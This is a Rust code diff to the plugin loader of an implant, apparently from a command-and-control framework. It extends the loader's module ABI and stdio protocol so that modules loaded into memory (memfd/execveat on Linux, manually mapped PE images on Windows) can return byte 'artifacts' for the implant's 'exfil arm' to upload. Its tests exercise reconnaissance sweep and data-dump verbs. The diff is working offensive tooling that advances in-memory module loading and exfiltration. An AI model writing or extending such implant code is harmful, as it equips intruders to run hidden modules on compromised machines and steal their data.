@@ -23,14 +23,19 @@ use std::collections::HashMap;
 use std::sync::{Arc, Mutex};
 
 use crate::channel;
-use crate::handlers::{self, Outcome};
+use crate::handlers::{self, ArtifactRun, HandlerOutput, Outcome};
 
 /// The module ABI version the loader speaks; the mirror of
 /// `rod_plugin_sdk::ABI_VERSION` (the Windows extern family) and of its
 /// `PROTOCOL_VERSION` (the Linux stdio frames) -- one number, two shapes.
 /// The crates share the contract, not a dependency: the implant defines
 /// its own copy the way every implant language would.
-const ABI_VERSION: u32 = 1;
+///
+/// ABI 2 adds the artifact return: `rod_plugin_run` grows its artifact out
+/// parameter and the stdio response frame grows its artifact section, so
+/// a module verb can hand the session a byte run the exfil arm uploads
+/// exactly like a compiled handler's.
+const ABI_VERSION: u32 = 2;
 
 /// A length-delimited byte string as it crosses the Windows boundary --
 /// the shape `rod-plugin-sdk`'s `RodStr` defines. Not NUL-terminated: task
@@ -68,16 +73,26 @@ impl AbiStr {
         let bytes = unsafe { std::slice::from_raw_parts(self.ptr, self.len) };
         String::from_utf8_lossy(bytes).into_owned()
     }
+
+    /// The buffer's raw bytes, for the artifact data's own copy-out --
+    /// bytes cannot ride the lossy text reader.
+    unsafe fn as_bytes(&self) -> &[u8] {
+        if self.ptr.is_null() || self.len == 0 {
+            return &[];
+        }
+        unsafe { std::slice::from_raw_parts(self.ptr, self.len) }
+    }
 }
 
 /// One run's outcome as the shim reports it: success or failure with the
-/// module's output string, or a shim error (an unknown index, a fenced
-/// panic) carrying the cause. Only the platform loaders construct these;
-/// the dormant seams' refusals never do (the cfg_attr silences the
+/// module's output string -- success carrying the optional artifact run
+/// the session uploads (ABI 2) -- or a shim error (an unknown index, a
+/// fenced panic) carrying the cause. Only the platform loaders construct
+/// these; the dormant seams' refusals never do (the cfg_attr silences the
 /// dead-code lint there alone).
 #[cfg_attr(any(target_os = "android", target_os = "macos"), allow(dead_code))]
 enum RunStatus {
-    Succeeded(String),
+    Succeeded(String, Option<ArtifactRun>),
     Failed(String),
     Error(String),
 }
@@ -150,7 +165,7 @@ impl ModuleEntry {
                 None
             }
             fn run(&self, _index: u32, _arguments: &str) -> RunStatus {
-                RunStatus::Succeeded("stub".into())
+                RunStatus::Succeeded("stub".into(), None)
             }
         }
         ModuleEntry::new(
@@ -290,7 +305,9 @@ impl Plugins {
     /// no route holds the verb. Runs outside the table lock: a long
     /// handler must not block the registry's own reads, and the Arc keeps
     /// the module alive for the run's duration however the table mutates.
-    pub fn dispatch(&self, verb: &str, arguments: &str) -> Option<(Outcome, String)> {
+    /// The answer is the same HandlerOutput a compiled handler produces,
+    /// artifact run included.
+    pub fn dispatch(&self, verb: &str, arguments: &str) -> Option<HandlerOutput> {
         let (module, index) = {
             let inner = self.inner.lock().expect("plugin table");
             inner
@@ -301,9 +318,17 @@ impl Plugins {
         let guard = module.library.lock().expect("library lock");
         let library = guard.as_ref()?;
         Some(match library.run(index, arguments) {
-            RunStatus::Succeeded(output) => (Outcome::Succeeded, output),
-            RunStatus::Failed(output) => (Outcome::Failed, output),
-            RunStatus::Error(cause) => (Outcome::Failed, format!("{verb}: {cause}")),
+            RunStatus::Succeeded(output, artifact) => HandlerOutput {
+                outcome: Outcome::Succeeded,
+                output,
+                artifact,
+            },
+            RunStatus::Failed(output) => HandlerOutput {
+                outcome: Outcome::Failed,
+                output,
+                artifact: None,
+            },
+            RunStatus::Error(cause) => HandlerOutput::fail(format!("{verb}: {cause}")),
         })
     }
 
@@ -456,12 +481,13 @@ mod executed {
     use std::os::unix::process::CommandExt;
     use std::process::{Command, Stdio};
 
-    use super::{Library, RunStatus};
+    use super::{ArtifactRun, Library, RunStatus};
 
     /// The protocol's version and operations, the mirror of
     /// rod-plugin-sdk's `protocol` module: the crates share the contract,
-    /// not a dependency.
-    const PROTOCOL_VERSION: u8 = 1;
+    /// not a dependency. Protocol 2 adds the artifact section every
+    /// response frame carries after its payload.
+    const PROTOCOL_VERSION: u8 = 2;
     const MAX_PAYLOAD: u32 = 64 << 20;
 
     mod op {
@@ -526,8 +552,14 @@ mod executed {
         }
 
         /// One request/response exchange over a fresh process: exec the
-        /// memfd, write the frame, read the answer, reap.
-        fn exchange(&self, op: u8, arg: u32, payload: &[u8]) -> Result<(u8, Vec<u8>), String> {
+        /// memfd, write the frame, read the answer (payload plus the
+        /// artifact section protocol 2 appends to every response), reap.
+        fn exchange(
+            &self,
+            op: u8,
+            arg: u32,
+            payload: &[u8],
+        ) -> Result<(u8, Vec<u8>, Option<ArtifactRun>), String> {
             let mut child = self
                 .spawn_module()
                 .map_err(|err| format!("execveat the staged module: {err}"))?;
@@ -569,8 +601,9 @@ mod executed {
             stdout
                 .read_exact(&mut body)
                 .map_err(|err| format!("the module's answer ended early: {err}"))?;
+            let artifact = read_artifact_section(&mut stdout)?;
             let _ = child.wait();
-            Ok((header[1], body))
+            Ok((header[1], body, artifact))
         }
     }
 
@@ -675,11 +708,61 @@ mod executed {
         }
     }
 
+    /// Reads the artifact section every protocol 2 response carries after
+    /// its payload: three length-prefixed strings, the zero name length
+    /// marking the absent run. The mirror of the SDK writer, byte for
+    /// byte.
+    fn read_artifact_section<R: std::io::Read>(
+        reader: &mut R,
+    ) -> Result<Option<ArtifactRun>, String> {
+        fn section<R: std::io::Read>(reader: &mut R, budget: &str) -> Result<Vec<u8>, String> {
+            let mut len = [0u8; 4];
+            reader
+                .read_exact(&mut len)
+                .map_err(|err| format!("the module's artifact section ended early: {err}"))?;
+            let len = u32::from_le_bytes(len);
+            if len > MAX_PAYLOAD {
+                return Err(format!(
+                    "the module's artifact {budget} exceeds the exchange budget"
+                ));
+            }
+            let mut bytes = vec![0u8; len as usize];
+            reader
+                .read_exact(&mut bytes)
+                .map_err(|err| format!("the module's artifact section ended early: {err}"))?;
+            Ok(bytes)
+        }
+
+        let name = section(reader, "name")?;
+        if name.is_empty() {
+            return Ok(None);
+        }
+        let content_type = section(reader, "content type")?;
+        let data = section(reader, "bytes")?;
+        Ok(Some(ArtifactRun {
+            name: String::from_utf8_lossy(&name).into_owned(),
+            content_type: String::from_utf8_lossy(&content_type).into_owned(),
+            data,
+        }))
+    }
+
+    // Test reach-throughs: the parser and the budget are private to the
+    // loader, and the tests pin the byte layout against hand-built frames.
+    #[cfg(test)]
+    pub(crate) fn read_artifact_section_for_test<R: std::io::Read>(
+        reader: &mut R,
+    ) -> Result<Option<ArtifactRun>, String> {
+        read_artifact_section(reader)
+    }
+
+    #[cfg(test)]
+    pub(crate) const MAX_PAYLOAD_FOR_TEST: u32 = MAX_PAYLOAD;
+
     impl Library for ExecLibrary {
         fn abi(&self) -> Result<u32, String> {
             match self.exchange(op::PING, 0, &[]) {
-                Ok((status::OK, _)) => Ok(PROTOCOL_VERSION as u32),
-                Ok((other, text)) => Err(format!(
+                Ok((status::OK, _, _)) => Ok(PROTOCOL_VERSION as u32),
+                Ok((other, text, _)) => Err(format!(
                     "module.load: the module's own ping answered status {other}: {}",
                     String::from_utf8_lossy(&text)
                 )),
@@ -691,14 +774,14 @@ mod executed {
 
         fn name(&self) -> String {
             self.exchange(op::NAME, 0, &[])
-                .map(|(_, body)| String::from_utf8_lossy(&body).into_owned())
+                .map(|(_, body, _)| String::from_utf8_lossy(&body).into_owned())
                 .unwrap_or_default()
         }
 
         fn verb_count(&self) -> u32 {
             self.exchange(op::COUNT, 0, &[])
                 .ok()
-                .and_then(|(_, body)| {
+                .and_then(|(_, body, _)| {
                     let bytes: [u8; 4] = body.as_slice().try_into().ok()?;
                     Some(u32::from_le_bytes(bytes))
                 })
@@ -717,20 +800,20 @@ mod executed {
 
         fn run(&self, index: u32, arguments: &str) -> RunStatus {
             match self.exchange(op::RUN, index, arguments.as_bytes()) {
-                Ok((status::OK, body)) => {
-                    RunStatus::Succeeded(String::from_utf8_lossy(&body).into_owned())
+                Ok((status::OK, body, artifact)) => {
+                    RunStatus::Succeeded(String::from_utf8_lossy(&body).into_owned(), artifact)
                 }
-                Ok((status::FAILED, body)) => {
+                Ok((status::FAILED, body, _)) => {
                     RunStatus::Failed(String::from_utf8_lossy(&body).into_owned())
                 }
-                Ok((status::BAD_REQUEST, _)) => {
+                Ok((status::BAD_REQUEST, _, _)) => {
                     RunStatus::Error("the module no longer holds that verb index".into())
                 }
-                Ok((status::PANICKED, body)) => RunStatus::Error(format!(
+                Ok((status::PANICKED, body, _)) => RunStatus::Error(format!(
                     "module handler panicked: {}",
                     String::from_utf8_lossy(&body)
                 )),
-                Ok((other, body)) => RunStatus::Error(format!(
+                Ok((other, body, _)) => RunStatus::Error(format!(
                     "module answered status {other}: {}",
                     String::from_utf8_lossy(&body)
                 )),
@@ -770,14 +853,34 @@ mod pe {
     // windows-sys feature for a value the ABI froze decades ago.
     const DLL_PROCESS_ATTACH: u32 = 1;
 
-    use super::{AbiStr, Library, RunStatus};
+    use super::{AbiStr, ArtifactRun, Library, RunStatus};
 
     type AbiFn = unsafe extern "C" fn() -> u32;
     type NameFn = unsafe extern "C" fn() -> AbiStr;
     type InitFn = unsafe extern "C" fn() -> u32;
     type VerbNameFn = unsafe extern "C" fn(u32) -> AbiStr;
-    type RunFn = unsafe extern "C" fn(u32, AbiStr, *mut AbiStr) -> i32;
+    type RunFn = unsafe extern "C" fn(u32, AbiStr, *mut AbiStr, *mut AbiArtifact) -> i32;
     type FreeFn = unsafe extern "C" fn(*mut u8, usize);
+
+    /// A run's optional artifact as `rod_plugin_run`'s ABI 2 out parameter
+    /// carries it: three module-owned strings freed through the module's
+    /// own export, the mirror of the SDK's `RodArtifact`.
+    #[repr(C)]
+    struct AbiArtifact {
+        name: AbiStr,
+        content_type: AbiStr,
+        data: AbiStr,
+    }
+
+    impl AbiArtifact {
+        fn none() -> AbiArtifact {
+            AbiArtifact {
+                name: AbiStr::empty(),
+                content_type: AbiStr::empty(),
+                data: AbiStr::empty(),
+            }
+        }
+    }
 
     /// One manually mapped image: the allocation plus the resolved export
     /// addresses. The unload posture is the map's own best-effort: routes
@@ -858,6 +961,33 @@ mod pe {
             text
         }
 
+        /// Copies a module-owned byte buffer out and returns it through the
+        /// module's free -- the artifact data's own discipline, since bytes
+        /// cannot ride the lossy text reader.
+        fn read_bytes(&self, string: AbiStr) -> Vec<u8> {
+            let bytes = unsafe { string.as_bytes() }.to_vec();
+            self.free_string(string);
+            bytes
+        }
+
+        /// Copies an artifact run out, freeing every buffer it rode; a null
+        /// name is the absent run.
+        fn read_artifact(&self, artifact: AbiArtifact) -> Option<ArtifactRun> {
+            if artifact.name.ptr.is_null() {
+                self.free_string(artifact.content_type);
+                self.free_string(artifact.data);
+                return None;
+            }
+            let name = self.read_owned(artifact.name);
+            let content_type = self.read_owned(artifact.content_type);
+            let data = self.read_bytes(artifact.data);
+            Some(ArtifactRun {
+                name,
+                content_type,
+                data,
+            })
+        }
+
         /// Returns module-allocated memory through the export the module
         /// ships for it; the host never frees module memory itself.
         fn free_string(&self, string: AbiStr) {
@@ -868,6 +998,15 @@ mod pe {
                 return;
             };
             unsafe { free(string.ptr, string.len) };
+        }
+
+        /// Drains an artifact the failure statuses leave behind: a module
+        /// that errored may still have filled buffers, and every
+        /// module-owned byte goes back through the module's own free.
+        fn free_artifact_buffers(&self, artifact: AbiArtifact) {
+            self.free_string(artifact.name);
+            self.free_string(artifact.content_type);
+            self.free_string(artifact.data);
         }
     }
 
@@ -912,12 +1051,19 @@ mod pe {
             };
             let args = AbiStr::from_slice(arguments.as_bytes());
             let mut out = AbiStr::empty();
-            let status = unsafe { run(index, args, &mut out) };
+            let mut artifact = AbiArtifact::none();
+            let status = unsafe { run(index, args, &mut out, &mut artifact) };
             let text = self.read_owned(out);
             match status {
-                0 => RunStatus::Succeeded(text),
-                1 => RunStatus::Failed(text),
-                other => RunStatus::Error(format!("shim status {other}: {text}")),
+                0 => RunStatus::Succeeded(text, self.read_artifact(artifact)),
+                1 => {
+                    self.free_artifact_buffers(artifact);
+                    RunStatus::Failed(text)
+                }
+                other => {
+                    self.free_artifact_buffers(artifact);
+                    RunStatus::Error(format!("shim status {other}: {text}"))
+                }
             }
         }
     }
@@ -1557,7 +1703,7 @@ mod tests {
             if self.fail {
                 RunStatus::Failed(format!("{verb} refused: {arguments}"))
             } else {
-                RunStatus::Succeeded(format!("{verb} ran: {arguments}"))
+                RunStatus::Succeeded(format!("{verb} ran: {arguments}"), None)
             }
         }
     }
@@ -1576,12 +1722,61 @@ mod tests {
     #[test]
     fn module_verbs_dispatch_like_compiled_ones() {
         let plugins = installed("sweep", &["recon.sweep"]);
-        let (outcome, output) = plugins
+        let run = plugins
             .dispatch("recon.sweep", "10.0.0.0/24")
             .expect("the route exists");
-        assert_eq!(outcome, Outcome::Succeeded);
-        assert_eq!(output, "recon.sweep ran: 10.0.0.0/24");
+        assert_eq!(run.outcome, Outcome::Succeeded);
+        assert_eq!(run.output, "recon.sweep ran: 10.0.0.0/24");
+        assert!(run.artifact.is_none());
         assert!(plugins.dispatch("no.such.verb", "").is_none());
+    }
+
+    #[test]
+    fn artifact_runs_ride_the_dispatch_like_a_compiled_handler_s() {
+        // ABI 2's whole point: a module verb's artifact run reaches the
+        // session's upload arm through the same HandlerOutput a compiled
+        // handler's does, named and typed.
+        struct ArtifactLibrary;
+        impl Library for ArtifactLibrary {
+            fn abi(&self) -> Result<u32, String> {
+                Ok(ABI_VERSION)
+            }
+            fn name(&self) -> String {
+                "dump".into()
+            }
+            fn verb_count(&self) -> u32 {
+                1
+            }
+            fn verb_name(&self, index: u32) -> Option<String> {
+                (index == 0).then(|| "collect.dump".to_string())
+            }
+            fn run(&self, _index: u32, arguments: &str) -> RunStatus {
+                RunStatus::Succeeded(
+                    "collected".into(),
+                    Some(ArtifactRun {
+                        name: "dump.bin".into(),
+                        content_type: "application/octet-stream".into(),
+                        data: arguments.as_bytes().to_vec(),
+                    }),
+                )
+            }
+        }
+        let plugins = Plugins::new();
+        plugins.install(ModuleEntry::new(
+            "dump".into(),
+            vec!["collect.dump".into()],
+            Box::new(ArtifactLibrary),
+        ));
+
+        let run = plugins
+            .dispatch("collect.dump", "BYTES")
+            .expect("the route exists");
+        assert_eq!(run.outcome, Outcome::Succeeded);
+        assert_eq!(run.output, "collected");
+        let artifact = run.artifact.expect("the run carries its artifact");
+        assert_eq!(artifact.name, "dump.bin");
+        assert_eq!(artifact.content_type, "application/octet-stream");
+        assert_eq!(artifact.data, b"BYTES");
     }
 
     #[test]
@@ -1633,8 +1828,8 @@ mod tests {
             vec!["recon.sweep".into()],
             Box::new(FakeLibrary::of("second", &["recon.sweep"])),
         ));
-        let (_, output) = plugins.dispatch("recon.sweep", "x").expect("routed");
-        assert!(output.starts_with("recon.sweep ran"), "{output}");
+        let run = plugins.dispatch("recon.sweep", "x").expect("routed");
+        assert!(run.output.starts_with("recon.sweep ran"), "{}", run.output);
         // Both modules remain listed; the verb names its current owner
         // only through dispatch -- the listing reports membership.
         assert!(plugins.list().contains("first"));
@@ -1669,5 +1864,40 @@ mod tests {
             .load("junk", b"not a module", &hash)
             .expect_err("not a loadable image");
         assert!(cause.contains("not a loadable module"), "{cause}");
+    }
+
+    #[cfg(all(unix, not(target_os = "android"), not(target_os = "macos")))]
+    #[test]
+    fn the_artifact_section_parses_as_the_sdk_writes_it() {
+        // The protocol's byte layout is the contract the SDK's writer and
+        // this reader share without sharing a crate: pin the absent run,
+        // the named run, and the refusal of an oversized section against
+        // hand-built frames shaped exactly like protocol 2 responses.
+        let mut absent = std::io::Cursor::new(0u32.to_le_bytes().to_vec());
+        assert!(executed::read_artifact_section_for_test(&mut absent)
+            .expect("the section parses")
+            .is_none());
+
+        let mut frame = Vec::new();
+        frame.extend_from_slice(&8u32.to_le_bytes());
+        frame.extend_from_slice(b"dump.bin");
+        frame.extend_from_slice(&24u32.to_le_bytes());
+        frame.extend_from_slice(b"application/octet-stream");
+        frame.extend_from_slice(&3u32.to_le_bytes());
+        frame.extend_from_slice(&[1, 2, 3]);
+        let mut present = std::io::Cursor::new(frame);
+        let run = executed::read_artifact_section_for_test(&mut present)
+            .expect("the section parses")
+            .expect("it carries a run");
+        assert_eq!(run.name, "dump.bin");
+        assert_eq!(run.content_type, "application/octet-stream");
+        assert_eq!(run.data, vec![1, 2, 3]);
+
+        let mut huge = Vec::new();
+        huge.extend_from_slice(&1u32.to_le_bytes());
+        huge.push(b'x');
+        huge.extend_from_slice(&(executed::MAX_PAYLOAD_FOR_TEST + 1).to_le_bytes());
+        let mut reader = std::io::Cursor::new(huge);
+        assert!(executed::read_artifact_section_for_test(&mut reader).is_err());
     }
 }
